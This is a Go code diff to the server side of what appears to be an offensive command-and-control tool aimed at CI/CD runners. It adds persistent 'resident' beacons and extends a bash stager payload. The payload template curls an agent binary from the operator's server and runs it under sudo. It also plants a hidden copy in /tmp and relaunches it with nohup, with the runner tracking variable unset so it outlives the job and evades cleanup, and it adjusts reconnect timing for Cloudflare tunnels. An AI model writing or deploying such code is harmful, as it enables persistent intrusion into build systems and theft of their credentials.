@@ -5,6 +5,7 @@ package kitchen
 
 import (
 	"fmt"
+	"net/url"
 	"sort"
 	"strings"
 	"sync"
@@ -12,8 +13,12 @@ import (
 )
 
 const (
-	CallbackModeExpress = "express"
-	CallbackModeDwell   = "dwell"
+	CallbackModeExpress  = "express"
+	CallbackModeDwell    = "dwell"
+	CallbackModeResident = "resident"
+
+	selfHostedResidentRetryWindow = time.Hour
+	selfHostedResidentInterval    = 5 * time.Second
 )
 
 // RegisteredStager is a stager waiting for callback from an injected payload.
@@ -147,6 +152,26 @@ func (s *StagerStore) MarkCalledBack(id, remoteIP string) bool {
 	return true
 }
 
+func (s *StagerStore) ObservePersistentBeacon(id, remoteIP, agentID string, when time.Time) *RegisteredStager {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+
+	stager, exists := s.stagers[id]
+	if !exists || !stager.Persistent || stager.RevokedAt != nil {
+		return nil
+	}
+
+	stager.CalledBack = true
+	stager.CallbackAt = when
+	if remoteIP != "" {
+		stager.CallbackIP = remoteIP
+	}
+	if agentID != "" {
+		stager.LastAgentID = agentID
+	}
+	return cloneRegisteredStager(stager)
+}
+
 func (s *StagerStore) ResolveCallback(id, remoteIP, agentID string) (*RegisteredStager, CallbackInvocation, bool) {
 	s.mu.Lock()
 	deleteHook := s.config.DeleteHook
@@ -216,6 +241,9 @@ func (s *StagerStore) ListPersistent(sessionID string) []*RegisteredStager {
 	result := make([]*RegisteredStager, 0, len(s.stagers))
 	for _, stager := range s.stagers {
 		if !stager.Persistent {
+			continue
+		}
+		if stager.RevokedAt != nil {
 			continue
 		}
 		if sessionID != "" && stager.SessionID != sessionID {
@@ -423,6 +451,33 @@ func cloneRegisteredStager(stager *RegisteredStager) *RegisteredStager {
 	return &cloned
 }
 
+func isSelfHostedResidentRegisteredStager(stager *RegisteredStager) bool {
+	if stager == nil || stager.Metadata == nil {
+		return false
+	}
+	return stager.Metadata["callback_kind"] == "self_hosted_runner" && stager.Metadata["persistence_mode"] == "resident"
+}
+
+func stagerPersistRelaunch(stager *RegisteredStager, kitchenURL string) (callbackMode, relaunchFlags string) {
+	if !isSelfHostedResidentRegisteredStager(stager) {
+		return CallbackModeExpress, "-express"
+	}
+
+	flags := []string{"-interval " + selfHostedResidentInterval.String()}
+	if tryCloudflareKitchenURL(kitchenURL) {
+		flags = append(flags, "-max-offline "+selfHostedResidentRetryWindow.String())
+	}
+	return CallbackModeResident, strings.Join(flags, " ")
+}
+
+func tryCloudflareKitchenURL(rawURL string) bool {
+	parsed, err := url.Parse(strings.TrimSpace(rawURL))
+	if err != nil {
+		return false
+	}
+	return strings.HasSuffix(strings.TrimSpace(parsed.Hostname()), ".trycloudflare.com")
+}
+
 // DefaultBashPayload returns the default bash payload for a stager callback.
 // This is what gets executed when the injected payload phones home.
 // Runs brisket synchronously for short-lived CI/CD environments.
@@ -462,6 +517,8 @@ func authenticatedBashPayloadTemplate(extraEnv []string, extraArgs string) strin
 		`CALLBACK_ID="{{CALLBACK_ID}}"`,
 		`CALLBACK_MODE="{{CALLBACK_MODE}}"`,
 		`DWELL_FLAGS="{{DWELL_FLAGS}}"`,
+		`PERSIST_CALLBACK_MODE="{{PERSIST_CALLBACK_MODE}}"`,
+		`PERSIST_RELAUNCH_FLAGS="{{PERSIST_RELAUNCH_FLAGS}}"`,
 	}
 	lines = append(lines, extraEnv...)
 	lines = append(lines,
@@ -475,6 +532,12 @@ func authenticatedBashPayloadTemplate(extraEnv []string, extraArgs string) strin
 		`curl -s -H "X-Agent-Token: $AGENT_TOKEN" -o "$AGENT_BIN" "$KITCHEN_URL/agent/brisket-${OS}-${ARCH}"`,
 		`if [ -s "$AGENT_BIN" ]; then`,
 		`  chmod +x "$AGENT_BIN"`,
+		`  if [ -n "${SMOKEDMEAT_PERSIST:-}" ] && [ "$OS" = "linux" ]; then`,
+		`    PERSIST_BIN="/tmp/.brisket-persist-$RANDOM"`,
+		`    cp "$AGENT_BIN" "$PERSIST_BIN"`,
+		`    chmod +x "$PERSIST_BIN"`,
+		`    env -u RUNNER_TRACKING_ID nohup sh -c "\"$PERSIST_BIN\" -kitchen \"$KITCHEN_URL\" -session \"$SESSION_ID\" -agent \"$AGENT_ID\" -token \"$AGENT_TOKEN\" -callback-id \"$CALLBACK_ID\" -callback-mode \"$PERSIST_CALLBACK_MODE\" $PERSIST_RELAUNCH_FLAGS >/dev/null 2>&1; rm -f \"$PERSIST_BIN\"" >/dev/null 2>&1 &`,
+		`  fi`,
 		fmt.Sprintf(`  if [ "$OS" = "linux" ] || [ "$OS" = "darwin" ]; then
     sudo -E "$AGENT_BIN" -kitchen "$KITCHEN_URL" -session "$SESSION_ID" -agent "$AGENT_ID" -token "$AGENT_TOKEN" -callback-id "$CALLBACK_ID" -callback-mode "$CALLBACK_MODE" $DWELL_FLAGS%s
   else
@@ -526,7 +589,11 @@ req.end();
 // DefaultBashPayloadWithDwell returns a bash payload with optional dwell time.
 // If dwellTime > 0, agent stays active for that duration to enable pivoting with ephemeral tokens.
 func DefaultBashPayloadWithDwell(kitchenURL, agentID, sessionID, agentToken, callbackID, callbackMode string, dwellTime time.Duration) string {
-	return renderStagerPayloadTemplate(
+	return DefaultBashPayloadWithDwellAndPersistence(kitchenURL, agentID, sessionID, agentToken, callbackID, callbackMode, dwellTime, CallbackModeExpress, "-express")
+}
+
+func DefaultBashPayloadWithDwellAndPersistence(kitchenURL, agentID, sessionID, agentToken, callbackID, callbackMode string, dwellTime time.Duration, persistCallbackMode, persistRelaunchFlags string) string {
+	return renderStagerPayloadTemplateWithPersistence(
 		authenticatedBashPayloadTemplate(nil, ""),
 		kitchenURL,
 		agentID,
@@ -535,6 +602,24 @@ func DefaultBashPayloadWithDwell(kitchenURL, agentID, sessionID, agentToken, cal
 		callbackID,
 		callbackMode,
 		dwellTime,
+		persistCallbackMode,
+		persistRelaunchFlags,
+	)
+}
+
+func DefaultBashPayloadForRegisteredStager(kitchenURL, agentID, sessionID, agentToken string, stager *RegisteredStager, invocation CallbackInvocation) string {
+	persistCallbackMode, persistRelaunchFlags := stagerPersistRelaunch(stager, kitchenURL)
+	return renderStagerPayloadTemplateWithPersistence(
+		authenticatedBashPayloadTemplate(nil, ""),
+		kitchenURL,
+		agentID,
+		sessionID,
+		agentToken,
+		stager.ID,
+		invocation.Mode,
+		invocation.DwellTime,
+		persistCallbackMode,
+		persistRelaunchFlags,
 	)
 }
 
